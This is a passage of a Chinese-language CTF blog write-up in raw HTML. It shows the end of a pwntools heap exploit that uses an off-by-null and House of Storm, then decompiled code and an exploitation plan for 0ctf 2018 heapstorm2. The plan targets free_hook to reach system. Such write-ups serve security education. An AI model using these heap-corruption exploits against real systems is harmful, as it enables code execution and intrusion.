class="hljs-attribute">sla</span>('?',str(index))<br><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">0</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">2</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">3</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span><br><br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">1</span>,'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)) <br><span class="hljs-attribute">edit</span>(<span class="hljs-number">4</span>,'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500)) <br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">0</span>,'a'*<span class="hljs-number">0</span>x18)#<span class="hljs-literal">off</span>-by-null改写chunk1的size为<span class="hljs-number">0</span>x500<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">7</span>  <br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>)    <br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#recover</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x30)#<span class="hljs-number">1</span> 此时chunk7可以控制原 （unsortedbin chunk  <span class="hljs-number">0</span>x4f1）的bk指针<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e0)#<span class="hljs-number">2</span><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">3</span>,'a'*<span class="hljs-number">0</span>x18)#<span class="hljs-literal">off</span> by null<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">8</span> <span class="hljs-number">0</span>x5a0<br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x40)#<span class="hljs-number">4</span> <span class="hljs-number">0</span>x580<br><br> <span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(<span class="hljs-number">0</span>x5c0)    which size is largebin FIFO<br> <br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)      # put chunk8(<span class="hljs-number">0</span>x5c0) to largebin<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>) #put chunk2 to unsortedbin<br><br><span class="hljs-comment">#dbg()</span><br> <span class="hljs-comment">#--------------修改他们是的满足条件进行 house of strom------------------------------#</span><br><span class="hljs-attribute">target</span> = <span class="hljs-number">0</span>xabcd0100<br><span class="hljs-attribute">fake_chunk</span> = target - <span class="hljs-number">0</span>x20<br><br><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) # size<br><span class="hljs-attribute">payload</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      # bk<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload2</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4e1) #size<br><span class="hljs-attribute">payload2</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>)   <br><span class="hljs-attribute">payload2</span> += p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)#mmap<br><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">8</span>,payload2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x40)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span> = '\x00'*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x30)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">2</span>,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">sla</span>('Choice: ','<span class="hljs-number">666</span>')<br><span class="hljs-attribute">s</span>(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>)<br><span class="hljs-attribute">itr</span>()<br></code></pre></td></tr></tbody></table></figure><h3 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>同样是保护全开，</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>实现四个功能，增删改查</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs csharp">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">main</span>(<span class="hljs-params">__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3</span>)</span><br>{<br>  __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]   //v4=0x13370800</span><br><br>  v4 = sub_BE6();<br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    <span class="hljs-keyword">switch</span> ( chioce(a1, a2) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1L</span>L:<br>        a1 = v4;<br>        <span class="hljs-keyword">add</span>(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2L</span>L:<br>        a1 = v4;<br>        up(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3L</span>L:<br>        a1 = v4;<br>        delete(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4L</span>L:<br>        a1 = v4;<br>        show(v4);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5L</span>L:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>      <span class="hljs-literal">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 sub_BE6()<br>{<br>  int i; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">18</span>h]<br>  int fd; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">14</span>h]<br><br>  setvbuf(stdin, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);<br>  alarm(<span class="hljs-number">0</span>x3Cu);<br>  puts(<br>    <span class="hljs-string">"    __ __ _____________   __   __    ___    ____\n"</span><br>    <span class="hljs-string">"   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"</span><br>    <span class="hljs-string">"  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"</span><br>    <span class="hljs-string">" / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"</span><br>    <span class="hljs-string">"/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n"</span>);<br>  puts(<span class="hljs-string">"===== HEAP STORM II ====="</span>);<br>  <span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )                         <span class="hljs-regexp">//</span> 禁用fastbin<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( mmap(<span class="hljs-number">0</span>x13370000, <span class="hljs-number">0</span>x1000uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL) != <span class="hljs-number">322371584</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( read(fd, <span class="hljs-number">0</span>x13370800, <span class="hljs-number">0</span>x18uLL) != <span class="hljs-number">24</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  close(fd);<br>  MEMORY[<span class="hljs-number">0</span>x13370818] = MEMORY[<span class="hljs-number">0</span>x13370810];<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2</span>LL) + <span class="hljs-number">0</span>x13370800) = ptr_xor(<span class="hljs-number">0</span>x13370800, <span class="hljs-number">0</span>LL);<br>    *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2</span>LL) + <span class="hljs-number">0</span>x13370808) = size_xor(<span class="hljs-number">0</span>x13370800LL, <span class="hljs-number">0</span>LL);<br>  }<br>  return <span class="hljs-number">0</span>x13370800LL;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="ptr-xor"><a href="#ptr-xor" class="headerlink" title="ptr_xor()"></a>ptr_xor()</h4><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall ptr<span class="hljs-constructor">_xor(<span class="hljs-params">_QWORD</span> <span class="hljs-operator">*</span><span class="hljs-params">a1</span>, <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>{<br>  return *a1 ^ a2;     <span class="hljs-comment">//a1为第一个随机数</span><br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="size-xor"><a href="#size-xor" class="headerlink" title="size_xor()"></a>size_xor()</h4><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall size<span class="hljs-constructor">_xor(<span class="hljs-params">__int64</span> <span class="hljs-params">a1</span>, <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>{<br>  return a2 ^ *(a1 + <span class="hljs-number">8</span>);<span class="hljs-comment">//a1+8为第一个随机数</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>readd函数存在一个off-by-one</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">unsigned</span> __int64 __fastcall sub_1402(__int64 <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>{<br>  __int64 <span class="hljs-built_in">v3</span><span class="hljs-comment">; // rax</span><br>  char buf<span class="hljs-comment">; // [rsp+17h] [rbp-19h] BYREF</span><br>  unsigned __int64 <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+18h] [rbp-18h]</span><br>  ssize_t <span class="hljs-built_in">v6</span><span class="hljs-comment">; // [rsp+20h] [rbp-10h]</span><br>  unsigned __int64 <span class="hljs-built_in">v7</span><span class="hljs-comment">; // [rsp+28h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">v7</span> = __readfsqword(<span class="hljs-number">0x28</span>u)<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( !<span class="hljs-built_in">a2</span> )<br>    return <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( <span class="hljs-built_in">a2</span> - <span class="hljs-number">1</span> &gt; <span class="hljs-built_in">v5</span> )<br>  {<br>    <span class="hljs-built_in">v6</span> = read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>uLL)<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v6</span> &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-meta">if</span> ( buf == <span class="hljs-number">10</span> )<br>        break<span class="hljs-comment">;</span><br>      <span class="hljs-built_in">v3</span> = <span class="hljs-built_in">v5</span>++<span class="hljs-comment">;</span><br>      *(<span class="hljs-built_in">v3</span> + <span class="hljs-built_in">a1</span>) = buf<span class="hljs-comment">;</span><br>    }<br>    <span class="hljs-meta">else</span> <span class="hljs-meta">if</span> ( *_errno_location() != <span class="hljs-number">11</span> &amp;&amp; *_errno_location() != <span class="hljs-number">4</span> )<br>    {<br>      break<span class="hljs-comment">;</span><br>    }<br>  }<br>  *(<span class="hljs-built_in">a1</span> + <span class="hljs-built_in">v5</span>) = <span class="hljs-number">0</span><span class="hljs-comment">;                               // off-by-null</span><br>  return <span class="hljs-built_in">v5</span><span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>add函数<br>只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> __fastcall <span class="hljs-title">add</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">size_xor</span>(a1, *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2LL</span>) + a1 + <span class="hljs-number">8</span>)) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = <span class="hljs-built_in">chioce</span>();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">12</span> &amp;&amp; size &lt;= <span class="hljs-number">4096</span> )<br>      {<br>        v3 = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2LL</span>) + a1 + <span class="hljs-number">8</span>) = <span class="hljs-built_in">size_xor</span>(a1, size);<br>        *(<span class="hljs-number">16</span> * (i + <span class="hljs-number">2LL</span>) + a1) = <span class="hljs-built_in">ptr_xor</span>(a1, v3);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Chunk %d Allocated\n"</span>, i);<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Size"</span>);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h4><p>读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __fastcall edit(_QWORD *<span class="hljs-built_in">a1</span>)<br>{<br>  signed int <span class="hljs-built_in">v2</span><span class="hljs-comment">; // [rsp+10h] [rbp-20h]</span><br>  int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+14h] [rbp-1Ch]</span><br>  __int64 <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+18h] [rbp-18h]</span><br><br>  printf(<span class="hljs-string">"Index: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v2</span> = chioce()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v2</span> &gt; <span class="hljs-number">0xF</span> <span class="hljs-title">||</span> !size_xor(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a1</span>[<span class="hljs-number">2</span> * <span class="hljs-built_in">v2</span> + <span class="hljs-number">5</span>]) )<br>    return puts(<span class="hljs-string">"Invalid Index"</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Size: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v3</span> = chioce()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v3</span> &lt;= <span class="hljs-number">0</span> <span class="hljs-title">||</span> <span class="hljs-built_in">v3</span> &gt; (size_xor(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a1</span>[<span class="hljs-number">2</span> * <span class="hljs-built_in">v2</span> + <span class="hljs-number">5</span>]) - <span class="hljs-number">12</span>) )<br>    return puts(<span class="hljs-string">"Invalid Size"</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Content: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = ptr_xor(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a1</span>[<span class="hljs-number">2</span> * <span class="hljs-built_in">v2</span> + <span class="hljs-number">4</span>])<span class="hljs-comment">;</span><br>  sub_1377(<span class="hljs-built_in">v4</span>, <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>  strcpy((<span class="hljs-built_in">v3</span> + <span class="hljs-built_in">v4</span>), <span class="hljs-string">"HEAPSTORM_II"</span>)<span class="hljs-comment">;</span><br>  return printf(<span class="hljs-string">"Chunk %d Updated\n"</span>, <span class="hljs-built_in">v2</span>)<span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="free函数-1"><a href="#free函数-1" class="headerlink" title="free函数"></a>free函数</h4><p>不存在uaf</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __fastcall sub<span class="hljs-constructor">_109B(<span class="hljs-params">_QWORD</span> <span class="hljs-operator">*</span><span class="hljs-params">a1</span>)</span><br>{<br>  void *v2; <span class="hljs-comment">// rax</span><br>  signed <span class="hljs-built_in">int</span> v3; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  printf(<span class="hljs-string">"Index: "</span>);<br>  v3 = chioce<span class="hljs-literal">()</span>;<br>  <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">0xF</span><span class="hljs-operator"> || </span>!size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v3</span> + 5])</span> )<br>    return puts(<span class="hljs-string">"Invalid Index"</span>);<br>  v2 = ptr<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v3</span> + 4])</span>;<br>  free(v2);<br>  a1<span class="hljs-literal">[<span class="hljs-number">2</span> <span class="hljs-operator">*</span> <span class="hljs-identifier">v3</span> + <span class="hljs-number">4</span>]</span> = ptr<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, 0LL)</span>;<br>  a1<span class="hljs-literal">[<span class="hljs-number">2</span> <span class="hljs-operator">*</span> <span class="hljs-identifier">v3</span> + <span class="hljs-number">5</span>]</span> = size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, 0LL)</span>;<br>  return printf(<span class="hljs-string">"Chunk %d Deleted\n"</span>, v3);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h4><p>需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __fastcall sub<span class="hljs-constructor">_11B5(<span class="hljs-params">_QWORD</span> <span class="hljs-operator">*</span><span class="hljs-params">a1</span>)</span><br>{<br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  signed <span class="hljs-built_in">int</span> v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( (a1<span class="hljs-literal">[<span class="hljs-number">3</span>]</span> ^ a1<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>) != <span class="hljs-number">0x13377331L</span>L )<br>    return puts(<span class="hljs-string">"Permission denied"</span>);<br>  printf(<span class="hljs-string">"Index: "</span>);<br>  v4 = chioce<span class="hljs-literal">()</span>;<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0xF</span><span class="hljs-operator"> || </span>!size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v4</span> + 5])</span> )<br>    return puts(<span class="hljs-string">"Invalid Index"</span>);<br>  printf(<span class="hljs-string">"Chunk[%d]: "</span>, v4);<br>  v2 = size<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v4</span> + 5])</span>;<br>  v3 = ptr<span class="hljs-constructor">_xor(<span class="hljs-params">a1</span>, <span class="hljs-params">a1</span>[2 <span class="hljs-operator">*</span> <span class="hljs-params">v4</span> + 4])</span>;<br>  sub<span class="hljs-constructor">_14D4(<span class="hljs-params">v3</span>, <span class="hljs-params">v2</span>)</span>;<br>  return puts(byte_180A);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组</p><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>先把前面的东西写好</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 